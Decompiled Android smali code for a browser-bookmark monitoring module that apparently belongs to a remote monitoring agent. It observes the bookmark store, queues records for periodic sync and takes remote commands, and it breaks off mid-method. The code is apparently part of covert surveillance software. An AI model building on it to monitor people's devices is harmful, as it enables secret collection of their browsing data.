.class public Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "BrowserBookmarkMonitor.java"


# static fields
.field public static final ATTRIBUTE_MAX_BOOKMARK_ID:Ljava/lang/String; = "max_bookmark_id"

.field public static final ATTRIBUTE_MAX_BOOKMARK_ID_CHROME_ROOT:Ljava/lang/String; = "max_bookmark_id_chrome_root"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field public static final COMMAND_SET_MAX_ID:Ljava/lang/String; = "set_max_id"

.field public static final PARAMETER_NEW_MAX_ID:Ljava/lang/String; = "new_max_id"

.field protected static final TAG:Ljava/lang/String; = "BrowserBookmarkMonitor"


# instance fields
.field protected browserBookmarkObservers:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;",
            ">;"
        }
    .end annotation
.end field

.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;"
        }
    .end annotation
.end field

.field protected lastSynchronization:Ljava/lang/Long;

.field protected listerThread:Ljava/lang/Thread;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 65
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    .line 76
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->browserBookmarkObservers:Ljava/util/ArrayList;

    const/4 v0, 0x0

    .line 78
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 79
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 80
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    .line 81
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 82
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    const/4 v1, 0x0

    .line 84
    iput-boolean v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->monitoringStatus:Z

    .line 86
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public buildChromeInputKey()Ljava/lang/String;
    .locals 1

    const-string v0, "max_bookmark_id_2"

    return-object v0
.end method

.method public buildDefaultInputKey()Ljava/lang/String;
    .locals 1

    const-string v0, "max_bookmark_id_1"

    return-object v0
.end method

.method public dispatch(Ljava/lang/String;Ljava/util/Map;Ljava/lang/String;)Z
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/util/Map<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;",
            "Ljava/lang/String;",
            ")Z"
        }
    .end annotation

    move-object v8, p0

    move-object v1, p2

    .line 426
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    .line 428
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->isActivated()Z

    move-result v3

    const/4 v4, 0x0

    if-nez v3, :cond_0

    const-string v1, "BrowserBookmarkMonitor"

    const-string v3, "dispatch(): This module is currently DEactivated."

    .line 429
    invoke-interface {v2, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v4

    .line 441
    :cond_0
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getModules()Ljava/util/List;

    move-result-object v3

    .line 443
    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    const/4 v6, 0x0

    if-eqz v5, :cond_2

    .line 444
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lcom/hp/vd/module/IModule;

    .line 445
    invoke-interface {v5}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v7

    const-string v9, "type"

    invoke-virtual {v7, v9}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_1

    const-string v9, "command-response-dispatcher"

    .line 447
    invoke-virtual {v7, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    goto :goto_0

    :cond_2
    move-object v5, v6

    :goto_0
    const/4 v3, 0x1

    const/4 v7, 0x3

    const/4 v9, 0x2

    if-eqz v5, :cond_3

    const/4 v10, 0x6

    .line 456
    :try_start_0
    new-array v10, v10, [Ljava/lang/Class;

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v4

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v3

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v9

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v7

    const/4 v11, 0x4

    const-class v12, Ljava/util/Date;

    aput-object v12, v10, v11

    const/4 v11, 0x5

    const-class v12, Ljava/util/Date;

    aput-object v12, v10, v11

    .line 465
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v11

    const-string v12, "dispatchResponse"

    .line 466
    invoke-virtual {v11, v12, v10}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v10
    :try_end_0
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    move-object v10, v0

    const-string v11, "BrowserBookmarkMonitor"

    const-string v12, "dispatch(): NoSuchMethodException caught when getting dispatchResponse()."

    .line 469
    invoke-interface {v2, v11, v12, v10}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_3
    move-object v10, v6

    :goto_1
    const-string v6, "set_max_id"

    move-object v11, p1

    .line 477
    invoke-virtual {v11, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_6

    const-string v3, "BrowserBookmarkMonitor"

    const-string v6, "dispatch(): dispatching set_max_id"

    .line 478
    invoke-interface {v2, v3, v6, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const-string v3, "new_max_id"

    .line 480
    invoke-interface {v1, v3}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_4

    const-string v1, "BrowserBookmarkMonitor"

    const-string v3, "dispatch(): dispatching set_max_id: parameter not set: new_max_id"

    .line 481
    invoke-interface {v2, v1, v3, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 487
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 493
    invoke-virtual {v8}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    .line 495
    invoke-virtual {v9}, Ljava/lang/Boolean;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v1, v8

    move-object v2, v5

    move-object v3, v10

    move-object/from16 v4, p3

    move-object v5, v6

    move-object v6, v11

    .line 489
    invoke-virtual/range {v1 .. v7}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->returnResponse(Lcom/hp/vd/module/IModule;Ljava/lang/reflect/Method;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    .line 498
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    return v1

    .line 501
    :cond_4
    iget-object v3, v8, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 502
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object v4

    const-string v6, "new_max_id"

    .line 503
    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 501
    invoke-virtual {v3, v4, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 506
    iget-object v3, v8, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 507
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object v4

    const-string v6, "new_max_id"

    .line 508
    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 506
    invoke-virtual {v3, v4, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "BrowserBookmarkMonitor"

    .line 511
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "dispatch(): max_bookmark_id_[0-1] is now: "

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "new_max_id"

    .line 513
    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 511
    invoke-interface {v2, v3, v1, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 517
    iget-object v1, v8, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v8, v1}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 519
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_5

    const-string v1, "BrowserBookmarkMonitor"

    const-string v3, "dispatch(): there was an error persisting the newly configured max_id."

    .line 520
    invoke-interface {v2, v1, v3, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 531
    :cond_5
    invoke-virtual {v8}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    .line 533
    invoke-virtual {v9}, Ljava/lang/Boolean;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v1, v8

    move-object v2, v5

    move-object v3, v10

    move-object/from16 v4, p3

    move-object v5, v6

    move-object v6, v11

    .line 527
    invoke-virtual/range {v1 .. v7}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->returnResponse(Lcom/hp/vd/module/IModule;Ljava/lang/reflect/Method;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    .line 536
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    return v1

    :cond_6
    return v3
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 93
    const-class v0, Lcom/hp/vd/data/BrowserBookmarkData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 98
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 100
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 101
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 102
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 103
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x6

    .line 104
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v6.0"

    .line 105
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 107
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 108
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object v1

    const-string v2, "0"

    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 109
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object v1

    const-string v2, "0"

    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_bookmark_id_chrome_root"

    const-string v2, "0"

    .line 110
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "synchronization_interval"

    const-string v2, "3540"

    .line 112
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v1, 0x5

    .line 114
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 115
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 117
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "BrowserBookmarkMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired(Ljava/lang/Long;I)Z
    .locals 8

    .line 785
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const/4 v1, 0x1

    if-nez p1, :cond_0

    return v1

    .line 791
    :cond_0
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    sub-long v6, v2, v4

    int-to-long p1, p2

    cmp-long v0, v6, p1

    if-lez v0, :cond_1

    return v1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method public initialize()Z
    .locals 13

    .line 245
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 251
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    const/4 v8, 0x0

    .line 258
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "bookmark_max_bookmark_id_1"

    const-string v2, "bookmark_max_bookmark_id_2"

    .line 267
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object v3

    .line 268
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object v4

    .line 270
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    const-string v6, "system"

    .line 272
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v7

    invoke-virtual {v7}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 270
    invoke-virtual {v5, v6, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 275
    invoke-interface {v5, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-nez v6, :cond_0

    invoke-interface {v5, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_6

    .line 276
    :cond_0
    invoke-interface {v5, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_1

    const-string v6, "0"

    .line 277
    invoke-interface {v5, v1, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 278
    iget-object v7, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v7, v3, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v7, "BrowserBookmarkMonitor"

    .line 280
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Loaded (after update) "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ": "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v7, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 283
    :cond_1
    invoke-interface {v5, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_2

    const-string v6, "0"

    .line 284
    invoke-interface {v5, v2, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 285
    iget-object v7, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v7, v4, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v7, "BrowserBookmarkMonitor"

    .line 287
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Loaded (after update) "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ": "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v7, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 290
    :cond_2
    iget-object v6, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v6

    if-nez v6, :cond_3

    const-string v1, "BrowserBookmarkMonitor"

    const-string v2, "Could not persist merged moduleData with preferences from the old version of this module"

    const/4 v5, 0x3

    .line 291
    invoke-interface {v0, v1, v2, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 305
    :cond_3
    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 307
    invoke-interface {v5, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 308
    invoke-interface {v6, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 311
    :cond_4
    invoke-interface {v5, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_5

    .line 312
    invoke-interface {v6, v2}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 315
    :cond_5
    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_6
    :goto_0
    const-string v1, "BrowserBookmarkMonitor"

    .line 320
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "initialize(): "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " set to "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v5, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const-string v1, "BrowserBookmarkMonitor"

    .line 322
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " set to "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    const-string v2, "BrowserBookmarkMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 325
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 333
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 340
    :goto_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    const/4 v9, 0x1

    if-gt v1, v2, :cond_7

    .line 341
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "BrowserBookmarkMonitor"

    const-string v3, "initialize(): running on <= LOLLIPOP. About to register observers (deactivate()d for now)"

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 356
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    .line 358
    new-instance v11, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;

    const/4 v2, 0x1

    sget-object v3, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

